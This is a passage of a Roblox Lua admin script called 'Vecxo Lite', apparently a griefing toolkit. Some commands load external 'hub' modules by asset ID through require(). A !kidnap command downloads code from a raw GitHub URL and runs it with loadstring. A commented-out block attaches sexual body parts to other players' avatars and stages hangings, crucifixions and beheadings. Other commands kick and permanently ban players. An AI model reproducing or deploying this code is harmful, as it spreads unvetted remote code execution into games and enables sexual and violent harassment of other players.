	elseif cmd == "!polaria" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(123255432303221):Pload(plr.Name)
				end)
			end
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Polaria hub ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!exser" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(10868847330):pls(plr.Name)
				end)
			end
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Exser ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!projhub" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(124840250479418)(plr.Name, "Standard")
				end)
			end
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Project hub ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	--[[elseif cmd == "!bang" and args[2] then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end

		if no ~= true then
			local arg, plr

			if args[3] then
				arg = args[2]
				plr = args[3]
			elseif args[2] and args[3] == nil then
				arg = sender.Name
				plr = args[2]
			else
				notify(sender, "[Vecxo Lite]: ", "You need to specify at least one player!")
				return
			end

			if arg == "me" then
				arg = sender.Name
			end

			local argt = GetPlayers(arg, sender)
			local argt2 = GetPlayers(plr, sender)

			if #argt2 <= 0 then
				V1 = workspace:FindFirstChild(plr)
				if V1 then
					V1 = V1.Torso
				else
					notifyv3(sender, "[Vecxo Lite]: ", "Invalid user / model!")
					return
				end
			else
				V1 = argt2[1]

				if V1.Character and V1.Character:FindFirstChild("Torso") and V1.Character:FindFirstChild("Humanoid") then
					V1 = argt2[1].Character:FindFirstChild("Torso")
				else
					notifyv3(sender, "[Vecxo Lite]: ", V1.Name .." Doesn't have a Torso!")
					return
				end
			end

			if argt[1].Character and argt[1].Character:FindFirstChild("Torso") and argt[1].Character:FindFirstChild("HumanoidRootPart") then

				local P1 = argt[1].Character:FindFirstChild("Torso")

				if #argt2 <= 0 and workspace:FindFirstChild(plr) then
					workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
					workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart").Massless = true
				else
					V1.Parent:FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
					V1.Parent:FindFirstChild("HumanoidRootPart").Massless = true
				end

				function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
					local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
					if (zCoco) then
						funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
					else
						funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
					end
					return funcw
				end

				local WE = nil

				V1.Parent:FindFirstChild("Humanoid").PlatformStand = true
				P1['Left Shoulder']:Destroy() local LA1 = Instance.new('Weld', P1) LA1.Part0 = P1 LA1.Part1 = P1.Parent['Left Arm'] LA1.C0 = CFrame.new(-1.5, 0, 0) LA1.Name = 'Left Shoulder'
				P1['Right Shoulder']:Destroy() local RS1 = Instance.new('Weld', P1) RS1.Part0 = P1 RS1.Part1 = P1.Parent['Right Arm'] RS1.C0 = CFrame.new(1.5, 0, 0) RS1.Name = 'Right Shoulder'
				V1['Left Shoulder']:Destroy() local LS2 = Instance.new('Weld', V1) LS2.Part0 = V1 LS2.Part1 = V1.Parent['Left Arm'] LS2.C0 = CFrame.new(-1.5, 0, 0) LS2.Name = 'Left Shoulder'
				V1['Right Shoulder']:Destroy() local RS2 = Instance.new('Weld', V1) RS2.Part0 = V1 RS2.Part1 = V1.Parent['Right Arm'] RS2.C0 = CFrame.new(1.5, 0, 0) RS2.Name = 'Right Shoulder'
				V1['Left Hip']:Destroy() local LH2 = Instance.new('Weld', V1) LH2.Part0 = V1 LH2.Part1 = V1.Parent['Left Leg'] LH2.C0 = CFrame.new(-0.5, -2, 0) LH2.Name = 'Left Hip'
				V1['Right Hip']:Destroy() local RH2 = Instance.new('Weld', V1) RH2.Part0 = V1 RH2.Part1 = V1.Parent['Right Leg'] RH2.C0 = CFrame.new(0.5, -2, 0) RH2.Name = 'Right Hip'

				local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = V1.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
				local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
				fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
				local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = V1.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
				local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
				fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
				local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
				local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
				fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
				local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
				local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
				fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
				local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = V1.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
				local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
				fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
				local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = V1.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
				local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
				fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)

				local tip = Instance.new("Part", argt[1].Character)
				local peep = Instance.new("Part", argt[1].Character)
				local ball1 = Instance.new("Part", argt[1].Character)
				local ball2 = Instance.new("Part", argt[1].Character)

				local tipmesh = Instance.new("SpecialMesh", tip)
				local peepmesh = Instance.new("CylinderMesh", peep)
				local ball1mesh = Instance.new("SpecialMesh", ball1)
				local ball2mesh = Instance.new("SpecialMesh", ball2)

				local tipweld = Instance.new("WeldConstraint", argt[1].Character)
				local peepweld = Instance.new("WeldConstraint", argt[1].Character)
				local peepweld2 = Instance.new("WeldConstraint", peep)
				local ball1weld = Instance.new("WeldConstraint", argt[1].Character)
				local ball2weld = Instance.new("WeldConstraint", argt[1].Character)

				tip.BrickColor = BrickColor.new("Pink")
				tip.Size = Vector3.new(1, 1, 1)
				tip.BottomSurface = "Smooth"
				tip.TopSurface = "Smooth"
				tip.CanCollide = false
				tip.Locked = true

				peep.Color = argt[1].Character.Torso.Color
				peep.Size = Vector3.new(0.4, 1.3, 0.4)
				peep.BottomSurface = "Smooth"
				peep.TopSurface = "Smooth"
				peep.CanCollide = false
				peep.Locked = true

				ball1.Color = argt[1].Character.Torso.Color
				ball1.Size = Vector3.new(1, 1, 1)
				ball1.BottomSurface = "Smooth"
				ball1.TopSurface = "Smooth"
				ball1.CanCollide = false
				ball1.Locked = true

				ball2.Color = argt[1].Character.Torso.Color
				ball2.Size = Vector3.new(1, 1, 1)
				ball2.BottomSurface = "Smooth"
				ball2.TopSurface = "Smooth"
				ball2.CanCollide = false
				ball2.Locked = true

				tipmesh.MeshType = "Sphere"
				tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)

				ball1mesh.MeshType = "Sphere"
				ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

				ball2mesh.MeshType = "Sphere"
				ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

				peep.CFrame = argt[1].Character.Torso.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(math.rad(90), 0, 0)
				tip.CFrame = peep.CFrame * CFrame.new(0, -0.7, 0)
				ball1.CFrame = peep.CFrame * CFrame.new(0.3, 0.4, 0.25)
				ball2.CFrame = peep.CFrame * CFrame.new(-0.3, 0.4, 0.25)

				tipweld.Part0 = argt[1].Character.Torso
				tipweld.Part1 = tip

				peepweld.Part0 = argt[1].Character.Torso
				peepweld.Part1 = peep

				peepweld2.Part0 = peep
				peepweld2.Part1 = tip

				ball1weld.Part0 = argt[1].Character.Torso
				ball1weld.Part1 = ball1

				ball2weld.Part0 = argt[1].Character.Torso
				ball2weld.Part1 = ball2

				LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0) RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
				LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0) RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
				LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0) RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)

				WE = fWeld('weldx', P1, P1, V1, true, 0, -1, -2, math.rad(-90), 0, 0)
				local N = V1.Neck N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)

				task.spawn(function() 
					while task.wait() do
						for i = 1, 6 do -- forwards
							WE.C0 = WE.C0 * CFrame.new(0, 0.1, 0)
							task.wait(0.030)
						end

						for i = 1, 6 do -- backwards
							WE.C0 = WE.C0 * CFrame.new(0, -0.1, 0)
							task.wait(0.030)
						end
						task.wait()
					end
				end)
			end
		end
	elseif cmd == "!woman" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end

		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				if plr.Character and plr.Character:FindFirstChild("Torso") then

					local V1 = plr.Character:FindFirstChild("Torso")

					function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
						local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
						if (zCoco) then
							funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
						else
							funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
						end
						return funcw
					end

					local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = plr.Character.Torso.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
					local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
					fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
					local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = plr.Character.Torso.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
					local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
					fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
					local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
					local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
					fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
					local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
					local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
					fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
					local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = plr.Character.Torso.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
					local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
					fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
					local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = plr.Character.Torso.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
					local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
					fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)

				end
			end
		end
	elseif cmd == "!hang" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Torso") then
				local function createPart(cf, size, material, color)
					local p = Instance.new("Part")
					p.Name = "cxo was here"
					p.Anchored = true
					p.CFrame = cf
					p.Size = size
					p.Material = material
					p.BrickColor = BrickColor.new(color)
					p.Parent = workspace
					return p
				end

				local root = plr.Character.HumanoidRootPart.CFrame

				local floor = createPart(root * CFrame.new(0, -2.5, 0), Vector3.new(16, 1, 16), Enum.Material.Wood, "Rust")
				local pole = createPart(floor.CFrame * CFrame.new(0, 6.5, 7), Vector3.new(2, 12, 2), Enum.Material.Wood, "Rust")
				local pole2 = createPart(pole.CFrame * CFrame.new(0, 6.5, -2), Vector3.new(2, 1, 6), Enum.Material.Wood, "Rust")

				local metal = createPart(pole.CFrame * CFrame.new(0, 7.05, -4), Vector3.new(2, 0.1, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal2 = createPart(metal.CFrame * CFrame.new(-1.05, -0.56, 0), Vector3.new(0.1, 1.213, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal3 = createPart(metal.CFrame * CFrame.new(1.05, -0.56, 0), Vector3.new(0.1, 1.213, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal4 = createPart(pole.CFrame * CFrame.new(0, 5.93, -4), Vector3.new(2, 0.1, 0.1), Enum.Material.DiamondPlate, "Black")

				local rope = createPart(metal4.CFrame * CFrame.new(0, -0.60, 0), Vector3.new(0.1, 1.113, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope2 = createPart(rope.CFrame * CFrame.new(0, -0.6, 0), Vector3.new(1.459, 0.1, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope3 = createPart(rope2.CFrame * CFrame.new(0.78, -0.5560, 0), Vector3.new(0.1, 1.215, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope4 = createPart(rope2.CFrame * CFrame.new(-0.78, -0.5560, 0), Vector3.new(0.1, 1.215, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope5 = createPart(rope.CFrame * CFrame.new(0, -1.715, 0), Vector3.new(1.459, 0.1, 0.1), Enum.Material.Leather, "Burnt Sienna")

				-- Position player
				plr.Character.HumanoidRootPart.Anchored = true
				plr.Character.Head.CFrame = rope5.CFrame * CFrame.new(0, 1, 0.5)
				if plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid:FindFirstChild("Animator") then
					plr.Character.Humanoid.Animator:Destroy()
				end
				if plr.Character.Torso:FindFirstChild("Neck") then
					plr.Character.Torso.Neck.C0 = plr.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(90), 0, 0)
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Hung " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!crucify" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player(s) '" .. args[2] .. "' not found.")
			return
		end

		for _, plr in ipairs(targets) do
			coroutine.wrap(function()
				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					local character = plr.Character
					local rootPart = character.HumanoidRootPart
					local humanoid = character:FindFirstChildOfClass("Humanoid")

					if humanoid:FindFirstChild("Animator") then
						humanoid.Animator:Destroy()
					end

					local cross = Instance.new("Model", workspace)

					local mainPost = Instance.new("Part")
					mainPost.Size = Vector3.new(2, 8, 1)
					mainPost.Material = Enum.Material.Wood
					mainPost.BrickColor = BrickColor.new("Reddish brown")
					mainPost.Anchored = true
					mainPost.Parent = cross

					local crossbar = Instance.new("Part")
					crossbar.Size = Vector3.new(6, 1, 1)
					crossbar.Position = Vector3.new(0,-3,0)
					crossbar.Material = Enum.Material.Wood
					crossbar.BrickColor = BrickColor.new("Reddish brown")
					crossbar.Anchored = true
					crossbar.Parent = cross

					local crossCFrame = rootPart.CFrame * CFrame.new(0, 4, 0)
					mainPost.CFrame = crossCFrame
					crossbar.CFrame = crossCFrame * CFrame.new(0, 2.5, 0)

					rootPart.CFrame = crossCFrame * CFrame.new(0, 2.5, -1)
					rootPart.Anchored = true

					local torso = character:FindFirstChild("Torso")
					local leftArm = character:FindFirstChild("Left Arm")
					local rightArm = character:FindFirstChild("Right Arm")

					local function Weld(part0, part1, cframe)
						local weld = Instance.new("Weld")
						weld.Part0 = part0
						weld.Part1 = part1
						weld.C0 = cframe
						weld.Parent = part0
						part1.Anchored = false
					end

					if leftArm then
						Weld(crossbar, leftArm, CFrame.new(-2, 0, -1) * CFrame.Angles(-2, 0, math.rad(-90)))
					end
					if rightArm then
						Weld(crossbar, rightArm, CFrame.new(2, 0, -1) * CFrame.Angles(2, 0, math.rad(90)))
					end
					if torso then
						Weld(mainPost, torso, CFrame.new(0, 1.5, -1))
					end

					local sound = Instance.new("Sound", rootPart)
					sound.SoundId = "rbxassetid://1846115874"
					sound.Volume = 2
					sound:Play()

					wait(6)

					local beam = Instance.new("Part", workspace)
					beam.Size = Vector3.new(2, 1, 2)
					beam.Position = rootPart.Position
					beam.Material = Enum.Material.Neon
					beam.BrickColor = BrickColor.new("Institutional white")
					beam.Transparency = 0.5
					beam.Anchored = true

					local GhostTorso = character:FindFirstChild("Torso") and character:FindFirstChild("Torso"):Clone()
					if GhostTorso then
						GhostTorso.Parent = beam
						GhostTorso.Transparency = 0.5
						GhostTorso.Anchored = true
					end

					for i = 1, 30 do
						beam.Size = Vector3.new(6, i * 3, 6)
						beam.Position = rootPart.Position + Vector3.new(0, i * 2, 0)
						rootPart.Position = rootPart.Position + Vector3.new(0, 3, 0)
						if GhostTorso then
							GhostTorso.Position = beam.Position + Vector3.new(0, 2, 0)
							GhostTorso.Transparency = math.min(1, GhostTorso.Transparency + 0.02)
						end
						wait(0.2)
					end

					humanoid.Health = 0
					wait(1)
					beam:Destroy()
					sound:Destroy()
					rootPart.Anchored = false
				end
			end)()
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Crucifying " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!guil" then --//ripped from dizzys admin
		handled = true
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player(s) '" .. args[2] .. "' not found.")
			return
		end

		for _, plr in ipairs(targets) do
			local character = plr.Character
			if not character then return end

			local rootPart = character:FindFirstChild("HumanoidRootPart")
			local head = character:FindFirstChild("Head")
			local torso = character:FindFirstChild("Torso")
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not (rootPart and head and torso and humanoid) then return end

			local base = Instance.new("Part", workspace)
			base.Name = "DIZZY behead moment"
			base.Size = Vector3.new(10, 1, 6)
			base.Position = rootPart.Position + Vector3.new(0, -3, 0)
			base.Material = Enum.Material.Wood
			base.BrickColor = BrickColor.new("Reddish brown")
			base.Anchored = true

			local leftPole = Instance.new("Part", workspace)
			leftPole.Name = "DIZZY behead moment"
			leftPole.Size = Vector3.new(1, 12, 1)
			leftPole.Position = base.Position + Vector3.new(-4, 6, 0)
			leftPole.Material = Enum.Material.Wood
			leftPole.BrickColor = BrickColor.new("Reddish brown")
			leftPole.Anchored = true

			local rightPole = Instance.new("Part", workspace)
			rightPole.Name = "DIZZY behead moment"
			rightPole.Size = Vector3.new(1, 12, 1)
			rightPole.Position = base.Position + Vector3.new(4, 6, 0)
			rightPole.Material = Enum.Material.Wood
			rightPole.BrickColor = BrickColor.new("Reddish brown")
			rightPole.Anchored = true

			local crossbar = Instance.new("Part", workspace)
			crossbar.Name = "DIZZY behead moment"
			crossbar.Size = Vector3.new(10, 1, 1)
			crossbar.Position = base.Position + Vector3.new(0, 12, 0)
			crossbar.Material = Enum.Material.Wood
			crossbar.BrickColor = BrickColor.new("Reddish brown")
			crossbar.Anchored = true

			local blade = Instance.new("Part", workspace)
			blade.Name = "DIZZY behead moment"
			blade.Size = Vector3.new(2, 2, 0.2)
			blade.Position = crossbar.Position + Vector3.new(0, -1, 0)
			blade.Material = Enum.Material.Metal
			blade.BrickColor = BrickColor.new("Dark stone grey")
			blade.Anchored = true

			local rope = Instance.new("Part", workspace)
			rope.Name = "DIZZY behead moment"
			rope.Size = Vector3.new(0.1, 2, 0.1)
			rope.Position = blade.Position + Vector3.new(0, 1, 0)
			rope.Material = Enum.Material.Rock
			rope.BrickColor = BrickColor.new("Burnt Sienna")
			rope.Anchored = true

			rootPart.CFrame = base.CFrame * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
			rootPart.Anchored = true

			if humanoid:FindFirstChild("Animator") then
				humanoid.Animator:Destroy()
			end

			for i = 1, 10 do
				blade.Position = blade.Position + Vector3.new(0, -0.5, 0)
				rope.Size = Vector3.new(0.1, 2 + (i * 0.5), 0.1)
				rope.Position = rope.Position + Vector3.new(0, -0.3, 0)
				task.wait(0.1)
			end

			local neck = torso:FindFirstChild("Neck")
			if neck then
				neck:Destroy()
			end

			head.CFrame = blade.CFrame * CFrame.new(0, -1, 0)
			head.Anchored = true

			local newhead = head:Clone()
			newhead.CFrame = blade.CFrame * CFrame.new(0, -1, 0)
			newhead.Anchored = true
			newhead.Parent = workspace

			local blood = Instance.new("Part", workspace)
			blood.Name = "DIZZY behead moment"
			blood.Size = Vector3.new(2, 0.2, 2)
			blood.Position = head.Position + Vector3.new(0, -4.3, 0)
			blood.Material = Enum.Material.SmoothPlastic
			blood.BrickColor = BrickColor.new("Bright red")
			blood.Anchored = true
			blood.Transparency = 0.5

			task.delay(5, function()
				if rootPart then rootPart.Anchored = false end
				if head then head.Anchored = false end
			end)

			plr.CharacterAdded:Connect(function(newCharacter)
				task.wait(1)
				local newHumanoidRootPart = newCharacter:FindFirstChild("HumanoidRootPart")
				if newHumanoidRootPart then
					newHumanoidRootPart.Anchored = false
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Beheading " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players")) ]]
	elseif cmd == "!kick" and args[2] then
		handled = true
		local reason = msg:match("^!kick%s+%S+%s+(.+)$")
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if not table.find(exclusivewl, targetPlayer.Name) then
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
				end)
				if reason then
					targetPlayer:Kick("[Vecxo Lite]: ‚ùå Kicked by " .. sender.Name .. ": " .. reason)
				else
					targetPlayer:Destroy()
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Kicked " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " successfully"))
	elseif cmd == "!kidnap" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then
				if not _G.kidnap then
					local success, result = pcall(function() -- clown van script
						return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/clownvan")
					end)

					if success then
						local content = result
						local loaded, fail = loadstring(content)
						if loaded then
							loaded()
							_G.kidnap(plr)
						else
							notifyv3(sender, "[Vecxo Lite]:", "‚ùå Failed to load the clown van")
						end
					else
						notifyv3(sender, "[Vecxo Lite]:", "‚ùå Failed to load the clown van")
					end
				else
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Really red", 2)
					end)
					_G.kidnap(plr)
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran clown van on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!unban" and args[2] then
		handled = true
		local inputName = args[2]:lower()
		local userId
		local matchedName
		for name, id in pairs(bannedNameLookup) do
			if name == inputName or name:sub(1, #inputName) == inputName then
				userId = id
				matchedName = name
				break
			end
		end
		if not userId then
			local success, plrid = pcall(function()
				return game.Players:GetUserIdFromNameAsync(args[2])
			end)

			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to find user ‚Äî is the name correct?")
				return
			end
			userId = plrid
			matchedName = args[2]
		end
		if bannedPlayers[userId] then
			bannedPlayers[userId] = nil
			for name, id in pairs(bannedNameLookup) do
				if id == userId then
					bannedNameLookup[name] = nil
					break
				end
			end
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ " .. matchedName .. " has been unbanned successfully.")
		else
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå " .. matchedName .. " is not currently banned.")
		end
	elseif cmd == "!permban" and args[2] then
		handled = true
		local reason = msg:match("^!permban%s+%S+%s+(.+)$") or "No reason provided"
		local targets = GetPlayers(args[2], sender)
		local banConfig = {
			UserIds = {},
			ApplyToUniverse = true,
			Duration = -1,
			DisplayReason = "[Vecxo Lite]: ‚ùå You have been permanently banned from this experience due too: "..reason,
			PrivateReason = "[Vecxo Lite]: Permanently banned by " .. sender.Name .. ": " .. reason,
			ExcludeAltAccounts = false
		}
		if #targets == 0 then
			local success, userId = pcall(function()
				return game.Players:GetUserIdFromNameAsync(args[2])
			end)
			if success and userId then
				local targ = game.Players:GetUserIdFromNameAsync(args[2])
				permBannedPlayers[targ] = true
				bannedPlayers[targ] = true
				banConfig.UserIds = {userId}
				local banSuccess, banError = pcall(function()
					return game.Players:BanAsync(banConfig)
				end)
				if banSuccess then
					notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Offline banned " .. args[2] .. " successfully")
				else
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to ban " .. args[2] .. ": " .. tostring(banError))
					permBannedPlayers[game.Players:GetUserIdFromNameAsync(args[2])] = nil
				end
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player '" .. args[2] .. "' not found.")
			end
			return
		end
		local userIds = {}
		for _, targetPlayer in ipairs(targets) do
			if not table.find(exclusivewl, targetPlayer.Name) then
				permBannedPlayers[targetPlayer.UserId] = true
				bannedPlayers[targetPlayer.UserId] = true
				bannedNameLookup[targetPlayer.Name:lower()] = targetPlayer.UserId
